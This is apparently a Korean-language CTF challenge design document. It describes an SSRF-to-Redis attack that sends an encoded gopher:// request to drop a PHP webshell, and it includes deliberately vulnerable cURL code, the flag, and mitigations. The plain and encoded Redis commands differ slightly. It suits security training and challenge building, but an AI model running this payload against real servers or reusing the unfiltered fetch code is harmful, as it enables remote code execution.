---
title: SSRF via Gopher Protocol to Internal Redis RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssrf, gopher, redis, rce, internal-network]
confidence: high
---

# SSRF via Gopher Protocol to Internal Redis RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Intranet Portal Fetcher (사설망 자원 수집기)
- **난이도**: High
- **핵심 컨셉**: 웹 서버 내부망의 취약점을 탐색해 원격 코드를 실행하는 **SSRF(Server-Side Request Forgery)** 심화 연계 문제입니다. 대상 웹 서비스는 외부 리소스(웹페이지 등)를 가져와 보여주는 Fetch API 기능을 제공합니다. 공격자는 이를 이용해 내부망 사설 주소로 패킷을 전송하는 기본 SSRF를 발견합니다. 단, 내부 서비스 중 하나인 **Redis**는 HTTP 프로토콜이 아닌 독자적 TCP 통신을 사용합니다. 공격자는 TCP 스트림을 자유롭게 인코딩하여 전송할 수 있는 **Gopher 프로토콜(`gopher://`)**을 유포 경로로 활용해 Redis 세션에 원격 RCE 명령을 주입하고 시스템 쉘 권한을 획득합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Fetch Console**: URL 주소를 입력하면 해당 자원을 서버 권한으로 요청하여 결과를 받아오는 화면.
- **Backend Service (Python/Flask or PHP)**:
  - 입력 URL에 대한 HTTP/HTTPS 프로토콜뿐 아니라 cURL 라이브러리 연동으로 인해 `gopher://` 등 다양한 프로토콜 해석 허용.
- **Internal Network Infrastructure**:
  - `127.0.0.1:6379` 또는 `10.0.0.5:6379` (인터넷 망에선 접근이 불가능하고 로컬 사설망 내부에서 비밀번호 없이 연동되어 가동 중인 Redis 캐시 서버).
- **Flag 위치**:
  - 내부 Redis 서버에 RCE를 성공시켜 생성된 웹셸의 실행 권한을 획득하거나, Redis 메모리 내의 `flag` 키 데이터 조회: `keys *`, `get flag`.

### 2.2 취약점 지점
1. **Unrestricted SSRF Protocols (cURL Default)**:
   - URL 스키마 검증 시 `http://`와 `https://` 외의 특수 프로토콜(`gopher://`, `dict://`, `file://` 등)에 대한 필터링이 누락되어 백엔드 cURL 엔진이 이를 그대로 가동시킵니다.
2. **Gopher Protocol Exploitation Capability**:
   - `gopher` 스키마는 URL 디코딩을 거쳐 임의의 포트(TCP)로 커스텀 개행 문자(`\r\n`)를 포함한 원시 바이트 스트림을 전달할 수 있어 비-HTTP 프로토콜 인터페이스 공격의 강력한 매개체가 됩니다.
3. **Weak Internal Service Authentication (Redis No Auth)**:
   - 사설 대역 내의 Redis 인스턴스가 패스워드 설정(`requirepass`)이 없는 상태로 설정되어 로컬에서 다이렉트 명령 주입이 허용됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/fetch?url=...` | GET | 없음 | URL 주소 | 요청 자원 결과 | SSRF 및 Gopher 프로토콜 주입 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. SSRF 취약성 및 내부망 포트 스캔
공격자는 URL 입력을 변조하여 로컬 루프백 주소의 포트 스캔을 수행합니다.
- `/fetch?url=http://127.0.0.1:80` (정상 웹포트)
- `/fetch?url=http://127.0.0.1:6379` (Redis 응답 - `Redis ...` 에러 코드 반환)
  이를 통해 6379 포트에 패스워드 없이 접근 가능한 Redis가 돌고 있음을 확인합니다.

### Step 2. Gopher 페이로드 인코딩 및 설계
Redis는 TCP 연결 수립 후 문자열 명령 행을 받아 동작합니다. 공격자는 Redis 메모리에 데이터를 쓰거나, 스케줄러(cron) 또는 웹셸 경로에 쓰기 연산을 수행하여 RCE를 노릴 수 있습니다. (여기서는 Redis 메모리의 플래그 키값을 얻거나 Crontab 역방향 쉘을 쏘도록 지시합니다.)
- **Redis 입력 명령 시퀀스**:
  ```text
  FLUSHALL
  SET flag_trigger "val"
  CONFIG SET dir /var/www/html
  CONFIG SET dbfilename shell.php
  SET payload "<?php system($_GET['cmd']); ?>"
  SAVE
  QUIT
  ```
- **Gopher URL 인코딩 변환**:
  개행(`\r\n`) 문자들을 URL 인코딩 포맷(`%0D%0A`)으로 바꾸어 gopher 프로토콜 양식으로 조합합니다.
  - *인코딩 템플릿 예시*:
    `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A...` (RESP 프로토콜 문법 포맷팅 또는 단순 텍스트 개행 변환)

### Step 3. cURL을 통한 SSRF 트리거
공격자는 인코딩된 Gopher 페이로드를 `/fetch` 엔드포인트의 파라미터로 넘깁니다.
- *최종 공격 요청*:
  ```http
  GET /fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%244%0D%0Acode%0D%0A%2429%0D%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A HTTP/1.1
  Host: fetcher.challenge.local
  ```

### Step 4. 웹셸 실행 및 플래그 획득
1. 백엔드 cURL은 gopher 해석기에 의해 로컬의 6379(Redis)로 TCP 세션을 연 후 위조된 명령어 페이로드를 강제 주입시킵니다.
2. Redis는 웹 루트 경로(`/var/www/html`) 아래에 `shell.php` 파일을 성공적으로 작성(Save)합니다.
3. 공격자는 생성된 웹셸 주소(`http://fetcher.challenge.local/shell.php?cmd=cat /flag.txt`)로 접속하여 쉘 명령을 통해 최종 플래그(`FLAG{ssrf_gopher_redis_rce_escalation}`)를 탈취합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP/curl)

```php
// fetch.php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    
    // 취약점 지점: URL의 프로토콜 스키마를 필터링하지 않고 
    // PHP cURL 세션을 그대로 기동시켜 전달
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    // cURL 기본 동작 옵션에 의해 gopher://, dict://, file:// 프로토콜이 모두 활성화됨
    $output = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo 'Error: ' . curl_error($ch);
    } else {
        echo $output;
    }
    curl_close($ch);
} else {
    echo "No URL specified.";
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **프로토콜 스키마 허용 리스트 적용 (Protocol Whitelisting)**:
   - 요청을 허용할 프로토콜 스키마를 오직 `http` 및 `https`로 엄격히 제한하고, 특수 스키마는 원천 필터링합니다.
   - **수정 예시**:
     ```php
     $allowed_protocols = ['http', 'https'];
     $parsed = parse_url($url);
     if (!in_array(strtolower($parsed['scheme']), $allowed_protocols)) {
         die("Blocked Protocol!");
     }
     ```
2. **사설망 IP 접근 원천 차단 및 DNS 확인 검증**:
   - Resolve된 대상 IP 대역이 내부 사설 IP(Private IP)에 속하는 경우 통신을 발생시키지 않도록 소켓 옵션 및 헬퍼 차단 로직을 추가합니다.
3. **내부 서비스 보안 인증 강화**:
   - 사설망 내부에 존재하더라도 Redis, Memcached 등의 임포턴트 캐시 서버에 강력한 비밀번호 설정(`requirepass`)을 의무화하고 바인딩 주소를 로컬에만 한정 짓지 말고 안전한 ACL 권한 설정을 가동합니다.
